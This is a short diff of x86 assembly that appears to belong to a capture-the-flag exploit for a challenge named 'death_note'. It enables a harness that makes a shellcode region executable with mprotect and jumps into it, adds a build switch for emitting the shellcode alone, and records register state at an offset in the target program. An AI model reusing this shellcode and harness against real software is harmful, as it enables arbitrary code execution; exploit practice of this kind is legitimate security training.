@@ -2,18 +2,27 @@
 .type main, @function
 
 main:
-	/*lea shellcode, %edx;
+// if SHELLCODE_ONLY is defined, <main> will be the shellcode because
+//  .text complains that it needs <main>
+
+#ifndef SHELLCODE_ONLY
+	// mprotect the <shellcode> region
+	lea shellcode, %edx;
 	and $0xfffff000, %edx;
 	push $0x7;
 	push $0x1000;
 	push %edx;
 	call mprotect;
+	// in the death_note: add_note + 160:
+	// ecx == 0
+	// edx == buffer itself
 	xor %ecx, %ecx;
 	lea shellcode, %edx;
 	push %edx;
 	call *(%esp);
 
-shellcode:*/
+shellcode:
+#endif
 	// edi == 0xffffffff
 	push %ecx;
 	pop %edi;
